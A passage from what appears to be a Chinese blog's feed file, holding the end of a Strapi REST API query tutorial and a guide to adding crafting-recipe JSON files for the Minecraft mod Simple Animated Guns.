#CE9178">"curr9bdzmqaxi6hz9sw2f7q8"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"name"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"d6ef9eb44aed2e7335cd59efc201a18b86d6fa60.jpg"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"alternativeText"</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"caption"</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"width"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1920</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"height"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1200</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"ext"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">".jpg"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"mime"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"image/jpeg"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"url"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"/uploads/d6ef9eb44aed2e7335cd59efc201a18b86d6fa60_41d5dbc6ce.jpg"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"createdAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-25T17:33:11.737Z"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"updatedAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-25T17:33:11.737Z"</span></span><span class="line"><span style="color: #D4D4D4">      },</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"article_category"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"id"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"documentId"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"dchbyr5f11zshu2gb2thyxvh"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"category_name"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"随想"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"category_alias"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"suixiang"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"createdAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-25T07:57:58.692Z"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"updatedAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-25T07:57:58.692Z"</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  ],</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"meta"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"pagination"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"page"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"pageSize"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">25</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"pageCount"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"total"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">2</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><h3 id="根据分类-id-和文章发布状态进行查询"><a class="markdownIt-Anchor" href="#根据分类-id-和文章发布状态进行查询"></a> 根据分类 id 和文章发布状态进行查询</h3><p>怎么根据分类 id 和文章发布状态进行查询？比如我要查询文章所属分类为随想且发布状态为已发布</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">GET</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">/api/articles?filters[article_category][id][</span><span style="color: #9CDCFE">$eq</span><span style="color: #CE9178">]=</span><span style="color: #B5CEA8">5</span><span style="color: #D4D4D4">&amp;</span><span style="color: #DCDCAA">filters[state][$eq]</span><span style="color: #D4D4D4">=</span><span style="color: #DCDCAA">true</span></span></code></pre></div></div></figure><h3 id="分页查询"><a class="markdownIt-Anchor" href="#分页查询"></a> 分页查询</h3><p>通过 <code>pagination</code> 参数在请求中实现分页查询。Strapi 的分页功能包括 <code>page</code>（页码）和 <code>pageSize</code>（每页显示的记录数），我们可以在 API 请求的 URL 中传递这些参数。例如：</p><p>查询第 2 页的数据，并且每页显示 5 条文章，URL 可以写成这样</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">GET</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">/api/articles?pagination[page]=</span><span style="color: #B5CEA8">2</span><span style="color: #D4D4D4">&amp;</span><span style="color: #9CDCFE">pagination</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">pageSize</span><span style="color: #D4D4D4">]=</span><span style="color: #B5CEA8">5</span></span></code></pre></div></div></figure><p>分页查询的结果中，Strapi 会在 <code>meta</code> 字段中返回有关分页的信息：</p><figure class="shiki json"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"data"</span><span style="color: #D4D4D4">: [ </span><span style="color: #F44747">...</span><span style="color: #D4D4D4"> ],  </span><span style="color: #6A9955">// 数据列表</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"meta"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"pagination"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"page"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">2</span><span style="color: #D4D4D4">,        </span><span style="color: #6A9955">// 当前页码</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"pageSize"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5</span><span style="color: #D4D4D4">,    </span><span style="color: #6A9955">// 每页显示条数</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"pageCount"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10</span><span style="color: #D4D4D4">,  </span><span style="color: #6A9955">// 总页数</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"total"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">50</span><span style="color: #D4D4D4">       </span><span style="color: #6A9955">// 总记录数</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><h3 id="模糊查询"><a class="markdownIt-Anchor" href="#模糊查询"></a> 模糊查询</h3><p>Strapi 支持通过 API 进行模糊查询，我们可以使用 <code>filters</code> 参数结合 <code>$contains</code> 运算符来实现模糊查询。例如：</p><p>根据文章标题（<code>title</code> 字段）进行模糊查询，查询包含某个关键词的文章列表，API 请求可以这样写：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">GET</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">/api/articles?filters[title][</span><span style="color: #9CDCFE">$contains</span><span style="color: #CE9178">]=keyWord</span></span></code></pre></div></div></figure><p>我们甚至可以结合分页查询和模糊查询</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">/api/articles?filters[title][$contains]</span><span style="color: #D4D4D4">=</span><span style="color: #DCDCAA">test</span><span style="color: #D4D4D4">&amp;</span><span style="color: #9CDCFE">pagination</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">page</span><span style="color: #D4D4D4">]=</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">&amp;</span><span style="color: #9CDCFE">pagination</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">pageSize</span><span style="color: #D4D4D4">]=</span><span style="color: #B5CEA8">5</span></span></code></pre></div></div></figure><h3 id="排序查询"><a class="markdownIt-Anchor" href="#排序查询"></a> 排序查询</h3><p>Strapi 支持通过 API 查询时对数据进行排序。我们可以使用 <code>sort</code> 参数来指定排序字段和顺序。</p><h4 id="单字段排序查询"><a class="markdownIt-Anchor" href="#单字段排序查询"></a> 单字段排序查询</h4><p>单字段排序查询例如：</p><p>根据 <code>updatedAt</code> 字段进行排序，可以按照如下方式查询最新更新的文章</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">GET</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">/api/articles?sort=updatedAt:desc</span></span></code></pre></div></div></figure><p><code>sort=updatedAt:desc</code>：按照 <code>updatedAt</code> 字段降序排列（最新的文章在前）</p><ul><li><code>desc</code>：降序排列，从新到旧。</li><li><code>asc</code>：升序排列，从旧到新。</li></ul><h4 id="多字段排序"><a class="markdownIt-Anchor" href="#多字段排序"></a> 多字段排序</h4><p>例如，首先按 <code>state</code>（状态），然后按 <code>updatedAt</code>：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">GET</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">/api/articles?sort=state:asc,updatedAt:desc</span></span></code></pre></div></div></figure><p>这将先按 <code>state</code> 升序排列，再按 <code>updatedAt</code> 降序排列。</p><h4 id="结合分页和过滤"><a class="markdownIt-Anchor" href="#结合分页和过滤"></a> 结合分页和过滤</h4><p>甚至可以将排序与分页、过滤结合使用。例如，查询标题中包含 <code>test</code> 的文章，按 <code>updatedAt</code> 从新到旧排序，并分页显示：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">GET</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">/api/articles?filters[title][</span><span style="color: #9CDCFE">$contains</span><span style="color: #CE9178">]=test</span><span style="color: #D4D4D4">&amp;</span><span style="color: #9CDCFE">sort</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">updatedAt:desc</span><span style="color: #D4D4D4">&amp;</span><span style="color: #9CDCFE">pagination</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">page</span><span style="color: #D4D4D4">]=</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">&amp;</span><span style="color: #9CDCFE">pagination</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">pageSize</span><span style="color: #D4D4D4">]=</span><span style="color: #B5CEA8">5</span></span></code></pre></div></div></figure><p>这会返回包含 <code>test</code> 关键词的文章，按更新时间降序排列，并分页显示。</p><h4 id="小结"><a class="markdownIt-Anchor" href="#小结"></a> 小结</h4><p>总之，Strapi 提供了多个过滤操作符，使得我们可以灵活地查询数据</p><ul><li><code>$eq</code>：精确匹配</li><li><code>$ne</code>：不等于</li><li><code>$lt</code>：小于</li><li><code>$lte</code>：小于或等于</li><li><code>$gt</code>：大于</li><li><code>$gte</code>：大于或等于</li><li><code>$contains</code>：包含（模糊查询）</li><li><code>$notContains</code>：不包含</li><li><code>$startsWith</code>：以指定字符串开头</li><li><code>$endsWith</code>：以指定字符串结尾</li></ul><h2 id="结语"><a class="markdownIt-Anchor" href="#结语"></a> 结语</h2><p>目前我碰到的问题基本就是这些，如果有更复杂的项目时，可能才会碰到更多问题……</p><blockquote><p>关于 Nginx 如何监听 Strapi 可以看看我的 <a href="https://4rozen.github.io/2023/10/26/Vue%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85+%E9%83%A8%E7%BD%B2%E5%88%B0GitHub%E4%B8%BAdemo.md/">Vue 打包</a>那篇文章：解决打包后的刷新 404 问题 -&gt;Github Pages 上的 history 路由模式的可行性 -&gt; 一个可能需要的配置参考</p></blockquote><p>我不得不说的是，Strapi 对于表与表之间的引用在 API 接口调试方面体验确实很糟糕，某些接口使用 <code>documentId</code> 有些接口却只认真实 <code>id</code></p><p>不过免费的可用，还能要求什么呢 (〃￣︶￣) 人 (￣︶￣〃)</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Strapi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Simple Animated Guns 游玩指南 / 教程</title>
      <link href="/posts/63649.html"/>
      <url>/posts/63649.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><meta name="description" content="Simple Animated Gun枪械mod在游戏中到底怎么使用合成配件？怎么使用配件？这一篇文章教会你。"><h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>本文将该 mod 的相关物品合成和使用方法进行了较为细致的讲解，帮助你较快掌握该 mod 的相关特性或者玩法，但是<strong>并没有</strong>涉及到物品属性的更改，如果你需要对相关物品进行<strong>属性修改</strong>，或许你可以在我的文章【<a href="https://4rozen.github.io/archives/Gamer/64665.html">Simple Animated Guns 枪械属性修改</a>】中找到灵感。</p><h2 id="我的环境"><a class="markdownIt-Anchor" href="#我的环境"></a> 我的环境</h2><p><strong>平台</strong>：<code>Windows11 Pro-23h2</code></p><p><strong>Minecraft 游戏版本</strong>：<code>1.20.1</code></p><p><strong>Mod 列表</strong>：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506012253931.png" alt="image-20250601225300806"></p><ul><li>其中，<code>Iris Shaders</code> 为光影运行需要，并非必须 mod</li></ul><p><strong>Simple Animated Guns (以下将简称为 S.A.G) 版本</strong>：<code>1.3</code></p><h2 id="汉化相关物品描述"><a class="markdownIt-Anchor" href="#汉化相关物品描述"></a> 汉化相关物品描述</h2><p>我自己使用的是 <code>i18n</code>，该 mod 很方便，直接下载对应版本进行安装即可。</p><p>该 mod 的 MC 百科地址：<a href="https://www.mcmod.cn/class/1188.html">[i18n] 自动汉化更新</a></p><h2 id="sag-的相关内容"><a class="markdownIt-Anchor" href="#sag-的相关内容"></a> S.A.G 的相关内容</h2><p>S.A.G 模组在游戏内将会占据三页内容：</p><ul><li>S.A.G Attachments：枪械配件</li><li> S.A.G Crafting：制作相关</li><li> S.A.G Guns &amp; Ammo：枪械和子弹</li></ul><h2 id="新增加的可制作物品"><a class="markdownIt-Anchor" href="#新增加的可制作物品"></a> 新增加的可制作物品</h2><p>在上述三页内容中的 Crafting 中，可以知道作者自己定义的可制作物品</p><h3 id="1-硬化铁粒hardened_iron_ingot"><a class="markdownIt-Anchor" href="#1-硬化铁粒hardened_iron_ingot"></a> 1、硬化铁粒（hardened_iron_ingot）</h3><p>合成：此物品可由 1 硬化铁锭合成得到 9 硬化铁粒</p><p>熔炼：无</p><h3 id="2-硬化铁锭hardened_iron_nugget"><a class="markdownIt-Anchor" href="#2-硬化铁锭hardened_iron_nugget"></a> 2、硬化铁锭（hardened_iron_nugget）</h3><p>合成：此物品可由 6 硬化铁粒合成得到 1 硬化铁锭</p><p>熔炼：此物品可由 1 富集铁熔炼得到 1 硬化铁锭</p><h3 id="3-富集铁enriched_iron"><a class="markdownIt-Anchor" href="#3-富集铁enriched_iron"></a> 3、富集铁（enriched_iron）</h3><p>合成：此物品可由 2 个铁锭 + 1 个煤炭合成得到 2 个富集铁</p><p>熔炼：无</p><h3 id="4-塑料plastic"><a class="markdownIt-Anchor" href="#4-塑料plastic"></a> 4、塑料（plastic）</h3><p>合成：无</p><p>熔炼：此物品可由 1 甘蔗熔炼得到 1 塑料</p><p>此外，便是各种枪支零件，具体合成 / 熔炼方式可以自行使用 <a href="https://www.mcmod.cn/class/1674.html">REI 模组</a>查看。</p><h2 id="枪械配件"><a class="markdownIt-Anchor" href="#枪械配件"></a> 枪械配件</h2><p>目前，在 Mod 的 1.3 版本中只存在三种配件：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506012313019.png" alt="image-20250601231304962"></p><p>第一个为<strong>全息瞄准镜</strong>（Holographic Sight）</p><p>第二个为<strong>前握把</strong>（foregrip）</p><p>第三个为<strong>炮口制动器</strong>（muzzle brake）</p><h3 id="配件制作"><a class="markdownIt-Anchor" href="#配件制作"></a> 配件制作</h3><p>知道有这些配件，还需要知道如何制作。如果你装载了 REI 这个 mod，你会发现使用快捷键 R（查看合成方法）和快捷键 U（查看用途）对这三个配件是无效的。</p><p>这是为什么呢？因为作者并未实现这三个配件的合成 / 熔炼方法：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506021832374.png" alt="image-20250602183237263"></p><p>上图中是作者在 1.20.1 版本分支的最后一次提交记录。</p><h3 id="新建配件合成配方"><a class="markdownIt-Anchor" href="#新建配件合成配方"></a> 新建配件合成配方</h3><p>于是，我只好自己尝试创建符合 <code>recipes</code> 的合成配方：</p><p>在 mod 列表中找到 <code>SimpleAnimatedGuns-1.20.1-v1.3-BETA-3.jar</code> 将其复制一份并<strong>解压</strong>出来，能得到 <code>SimpleAnimatedGuns-1.20.1-v1.3-BETA-3\data\anim_guns\recipes</code> 这个存放合成配方的文件夹。那么，只需要自己创建合成配方 json 文件即可。</p><p>我结合作者定义的可参与合成的新物品，对于上述三种配件的合成方式设想如下：</p><ol><li><p>全息瞄准镜（<strong>sight_holo.json</strong>）</p><p><strong>P</strong>：<code>anim_guns:plastic</code> （塑料）</p><p><strong>G</strong>：<code>minecraft:glass_pane</code> （玻璃板）</p><p><strong>R</strong>：<code>minecraft:redstone</code> （红石粉）</p><p><strong>E</strong>：<code>anim_guns:enriched_iron</code> （富集铁）</p><figure class="shiki json"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"type"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"minecraft:crafting_shaped"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"pattern"</span><span style="color: #D4D4D4">: [</span><span style="color: #CE9178">"PGP"</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">" R "</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">" E "</span><span style="color: #D4D4D4">],</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"key"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"P"</span><span style="color: #D4D4D4">: { </span><span style="color: #9CDCFE">"item"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"anim_guns:plastic"</span><span style="color: #D4D4D4"> },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"G"</span><span style="color: #D4D4D4">: { </span><span style="color: #9CDCFE">"item"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"minecraft:glass_pane"</span><span style="color: #D4D4D4"> },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"R"</span><span style="color: #D4D4D4">: { </span><span style="color: #9CDCFE">"item"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"minecraft:redstone"</span><span style="color: #D4D4D4"> },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"E"</span><span style="color: #D4D4D4">: { </span><span style="color: #9CDCFE">"item"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"anim_guns:enriched_iron"</span><span style="color: #D4D4D4"> }</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"result"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"item"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"anim_guns:sight_holo"</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure></li><li><p>前握把（<strong>grip_foregrip.json</strong>）<br><strong>I</strong>：<code>anim_guns:hardened_iron_ingot</code> （硬化铁锭）</p><p><strong>G</strong>：<code>anim_guns:hardened_iron_nugget</code> （硬化铁粒）</p><p><strong>E</strong>：<code>anim_guns:enriched_iron</code> （富集铁）</p><figure class="shiki json"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"type"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"minecraft:crafting_shaped"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"pattern"</span><span style="color: #D4D4D4">: [</span><span style="color: #CE9178">" I "</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">"GEG"</span><span style="color: #D4D4D4">],</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"key"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"I"</span><span style="color: #D4D4D4">: { </span><span style="color: #9CDCFE">"item"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"anim_guns:hardened_iron_ingot"</span><span style="color: #D4D4D4"> },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"G"</span><span style="color: #D4D4D4">: { </span><span style="color: #9CDCFE">"item"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"anim_guns:hardened_iron_nugget"</span><span style="color: #D4D4D4"> },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"E"</span><span style="color: #D4D4D4">: { </span><span style="color: #9CDCFE">"item"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"anim_guns:enriched_iron"</span><span style="color: #D4D4D4"> }</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"result"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"item"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"anim_guns:grip_foregrip"</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure></li><li><p>炮口制动器（<strong>muzzle_mbrake.json</strong>）</p><p><strong>G</strong>：<code>anim_guns:hardened_iron_nugget</code> （硬化铁粒）</p><p><strong>I</strong>：<code>anim_guns:hardened_iron_ingot</code> （硬化铁锭）</p><p><strong>E</strong>：<code>anim_guns:enriched_iron</code> （富集铁）</p><figure class="shiki json"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"type"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"minecraft:crafting_shaped"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"pattern"</span><span style="color: #D4D4D4">: [</span><span style="color: #CE9178">"GIG"</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">"   "</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">" E "</span><span style="color: #D4D4D4">],</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"key"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"G"</span><span style="color: #D4D4D4">: { </span><span style="color: #9CDCFE">"item"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"anim_guns:hardened_iron_nugget"</span><span style="color: #D4D4D4"> },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"I"</span><span style="color: #D4D4D4">: { </span><span style="color: #9CDCFE">"item"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"anim_guns:hardened_iron_ingot"</span><span style="color: #D4D4D4"> },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"E"</span><span style="color: #D4D4D4">: { </span><span style="color: #9CDCFE">"item"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"anim_guns:enriched_iron"</span><span style="color: #D4D4D4"> }</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"result"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"item"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"anim_guns:muzzle_mbrake"</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure></li></ol><h3 id="修改方案注意"><a class="markdownIt-Anchor" href="#修改方案注意"></a> 修改方案注意</h3><p>如果上述设计方案存在不合理之处，想要进行自行修改的话，请确保修改后 key 中的 item 项的值为<strong>真实存在</strong>的物品 id，此值不可瞎编。</p><p>举例来说，上面 <code>muzzle_mbrake.json</code> 的 <code>E</code>（该字母可以随意指定）代表的 <code>item</code> 的值即是下面的 <code>anim_guns:enriched_iron</code>：</p><figure class="shiki json"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #CE9178">"E"</span><span style="color: #D4D4D4">: { </span><span style="color: #9CDCFE">"item"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"anim_guns:enriched_iron"</span><span style="color: #D4D4D4"> }</span></span></code></pre></div></div></figure><p>如果你想知道是否存在某个 id 值，可以在游戏中使用下面的命令进行测试：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">/give</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">@p</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">anim_guns:sight_holo</span></span></code></pre></div></div></figure><p>你只需要对 <code>anim_guns:sight_holo</code> 中冒号前后的两者进行补全试探即可。</p><p>如果你不知道 